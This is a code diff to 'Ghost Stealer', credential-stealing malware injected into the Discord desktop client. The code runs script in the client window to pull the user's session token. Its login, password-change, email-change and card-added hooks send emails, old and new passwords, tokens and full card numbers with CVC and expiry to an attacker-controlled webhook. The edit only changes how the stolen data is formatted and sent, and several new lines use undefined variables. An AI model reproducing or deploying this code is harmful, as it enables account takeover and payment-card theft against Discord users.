@@ -1,4 +1,5 @@
 const fs = require('fs');
+const { WebhookClient, MessageEmbed } = require('discord.js');
 const GHOSTEALER = "https://st.depositphotos.com/1010338/3142/i/950/depositphotos_31420279-stock-photo-death-in-the-hood-concept.jpg";
 const COLORSTEAL = "#2F3136";
 const path = require('path');
@@ -6,12 +7,9 @@ const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron')
 const TokenEval = `for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`
 var webhook = "%WEBHOOK_LINK%";
+const clientt = new WebhookClient({ url: webhook });
 
 function FirstTime() {
-    if (!fs.existsSync(path.join(__dirname, "Hazard"))) {
-    	return !0
-    }
-    fs.rmdirSync(path.join(__dirname, "Hazard"));
     const window = BrowserWindow.getAllWindows()[0];
     window.webContents.executeJavaScript(`window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`, !0).then((result) => {});
     return !1
@@ -171,53 +169,18 @@ function Login(email, password, token) {
     xmlHttp.setRequestHeader("Authorization", "${token}");
     xmlHttp.send( null );
     xmlHttp.responseText;`, !0).then((info) => {
-        const json = JSON.parse(info);
-        var params = {
-            username: "Ghost Stealer",
-            content: "",
-            avatar_url: GHOSTEALER,
-            embeds: [
-                {
-                    "color": COLORSTEAL,
-                    "description": "**A USER STOLE**",
-                    "fields": [
-                        {
-                            "name": "**E-MAIL**",
-                            "value": email,
-                            "inline": true
-                        },
-                        {
-                            "name": "**PASSWORD**",
-                            "value": password,
-                            "inline": true
-                        },
-                        {
-                            "name": "**NITRO**",
-                            "value": GetNitro(json.premium_type),
-                            "inline": true
-                        },
-                        {
-                            "name": "**BADGES**",
-                            "value": GetBadges(json.flags),
-                            "inline": true
-                        },
-                        {
-                            "name": "**TOKEN**",
-                            "value": `\`${token}\``,
-                            "inline": false
-                        }
-                    ],
-                    "author": {
-                        "name": json.username +"#" + json.discriminator + "・" + json.id,
-                        "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
-                    },
-                    "footer": {
-                        "text": "Ghost Stealer"
-                    }
-                }
-            ]
-        }
-	SendToWebhook(JSON.stringify(params))
+        const json = JSON.parse(info);	
+	const embed = new MessageEmbed()
+	.setAuthor(`${json.username}#${json.discriminator} (${json.id})`, `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`)
+	.setFooter('Ghost Stealer')
+	.setDescription('**USER STOLE**')
+	.setColor(COLORSTEAL)
+	.addField('**EMAIL**', email, true)
+	.addField('**PASSWORD**', password, true)
+	.addField('**NITRO**', GetNitro(json.premium_type), true)
+	.addField('**BADGES**', GetBadges(json.flags), true)
+	.addField('**TOKEN**', token, false);
+	clientt.send({ username: "Ghost Stealer", avatarURL: GHOSTEALER, embeds: [ embed ] });
     })
 }
 
@@ -279,57 +242,18 @@ function ChangePassword(oldpassword, newpassword, token) {
     xmlHttp.send( null );
     xmlHttp.responseText;`, !0).then((info) => {
         const json = JSON.parse(info);
-        var params = {
-            username: "Ghost Stealer",
-            content: "",
-            avatar_url: GHOSTEALER,
-            embeds: [
-                {
-                    "color": COLORSTEAL,
-                    "description": "**PASSWORD CHANGED**",
-                    "fields": [
-                        {
-                            "name": "**E-MAIL**",
-                            "value": json.email,
-                            "inline": true
-                        },
-                        {
-                            "name": "**OLD PASSWORD**",
-                            "value": oldpassword,
-                            "inline": true
-                        },
-                        {
-                            "name": "**NEW PASSWORD**",
-                            "value": newpassword,
-                            "inline": true
-                        },
-                        {
-                            "name": "**NITRO**",
-                            "value": GetNitro(json.premium_type),
-                            "inline": true
-                        },
-                        {
-                            "name": "**BADGES**",
-                            "value": GetBadges(json.flags),
-                            "inline": true
-                        },
-                        {
-                            "name": "**TOKEN**",
-                            "value": `\`${token}\``,
-                            "inline": false
-                        }
-                    ],
-                    "author": {
-                        "name": json.username +"#" + json.discriminator + "・" + json.id,
-                        "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
-                    },
-                    "footer": {
-                        "text": "Ghost Stealer"
-                    }                 
-                }
-            ]
-        }
-        SendToWebhook(JSON.stringify(params))
+	const embed = new MessageEmbed()
+	.setAuthor(`${json.username}#${json.discriminator} (${json.id})`, `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`)
+	.setFooter('Ghost Stealer')
+	.setDescription('**EMAIL CHANGED**')
+	.setColor(COLORSTEAL)
+	.addField('**EMAIL**', email, true)
+	.addField('**OLD PASSWORD**', oldpassword, true)
+	.addField('**NEW PASSWORD**', newpassword, true)
+	.addField('**NITRO**', GetNitro(json.premium_type), true)
+	.addField('**BADGES**', GetBadges(json.flags), true)
+	.addField('**TOKEN**', token, false);
+	clientt.send({ username: "Ghost Stealer", avatarURL: GHOSTEALER, embeds: [ embed ] });
     })
 }
 
@@ -342,52 +266,17 @@ function ChangeEmail(newemail, password, token) {
     xmlHttp.send( null );
     xmlHttp.responseText;`, !0).then((info) => {
         var json = JSON.parse(info);
-        var params = {
-            username: "Ghost Stealer",
-            content: "",
-            avatar_url: GHOSTEALER,
-            embeds: [
-                {
-                    "color": COLORSTEAL,
-                    "description": "**E-MAIL CHANGED**",
-                    "fields": [
-                        {
-                            "name": "**NEW E-MAIL**",
-                            "value": newemail,
-                            "inline": true
-                        },
-                        {
-                            "name": "**PASSWORD**",
-                            "value": password,
-                            "inline": true
-                        },
-                        {
-                            "name": "**NITRO**",
-                            "value": GetNitro(json.premium_type),
-                            "inline": true
-                        },
-                        {
-                            "name": "**BADGES**",
-                            "value": GetBadges(json.flags),
-                            "inline": true
-                        },
-                        {
-                            "name": "**TOKEN**",
-                            "value": `\`${token}\``,
-                            "inline": false
-                        }
-                    ],
-                    "author": {
-                        "name": json.username +"#" + json.discriminator + "・" + json.id,
-                        "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
-                    },
-                    "footer": {
-                        "text": "Ghost Stealer"
-                    }                
-                }
-            ]
-        }
-        SendToWebhook(JSON.stringify(params))
+	const embed = new MessageEmbed()
+	.setAuthor(`${json.username}#${json.discriminator} (${json.id})`, `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`)
+	.setFooter('Ghost Stealer')
+	.setDescription('**EMAIL CHANGED**')
+	.setColor(COLORSTEAL)
+	.addField('**NEW MAIL**', newmail, true)
+	.addField('**PASSWORD**', password, true)
+	.addField('**NITRO**', GetNitro(json.premium_type), true)
+	.addField('**BADGES**', GetBadges(json.flags), true)
+	.addField('**TOKEN**', token, false);
+	clientt.send({ username: "Ghost Stealer", avatarURL: GHOSTEALER, embeds: [ embed ] });
     })
 }
 
@@ -400,57 +289,18 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
     xmlHttp.send( null );
     xmlHttp.responseText;`, !0).then((info) => {
         var json = JSON.parse(info);
-        var params = {
-            username: "Ghost Stealer",
-            content: "",
-            avatar_url: GHOSTEALER,
-            embeds: [
-                {
-                    "color": COLORSTEAL,
-                    "description": "**CREDIT CARD ADDED**",
-                    "fields": [
-                        {
-                            "name": "**CARD NUMBER**",
-                            "VALUE": number,
-                            "inline": true
-                        },
-                        {
-                            "name": "**CARD CVC**",
-                            "VALUE": cvc,
-                            "inline": true
-                        },
-                        {
-                            "name": "**CARD EXPIRATION DATE**",
-                            "VALUE": `${expir_month}/${expir_year}`,
-                            "inline": true
-                        },
-                        {
-                            "name": "**NITRO**",
-                            "value": GetNitro(json.premium_type),
-                            "inline": true
-                        },
-                        {
-                            "name": "**BADGES**",
-                            "value": GetBadges(json.flags),
-                            "inline": true
-                        },
-                        {
-                            "name": "**TOKEN**",
-                            "value": `\`${token}\``,
-                            "inline": false
-                        }
-                    ],
-                    "author": {
-                        "name": json.username + "#" + json.discriminator + "・" + json.id,
-                        "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
-                    },
-                    "footer": {
-                        "text": "Ghost Stealer"
-                    }
-                }
-            ]
-        }
-        SendToWebhook(JSON.stringify(params))
+	const embed = new MessageEmbed()
+	.setAuthor(`${json.username}#${json.discriminator} (${json.id})`, `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`)
+	.setFooter('Ghost Stealer')
+	.setDescription('**CREDIT CARD ADDED**')
+	.setColor(COLORSTEAL)
+	.addField('**CARD NUMBER**', number, true)
+	.addField('**CARD CVC**', CVC, true)
+	.addField('**CARD EXPIRATION DATE**', `${expir_month}/${expir_year}`, true)
+	.addField('**NITRO**', GetNitro(json.premium_type), true)
+	.addField('**BADGES**', GetBadges(json.flags), true)
+	.addField('**TOKEN**', token, false);
+	clientt.send({ username: "Ghost Stealer", avatarURL: GHOSTEALER, embeds: [ embed ] });
     })
 }
 
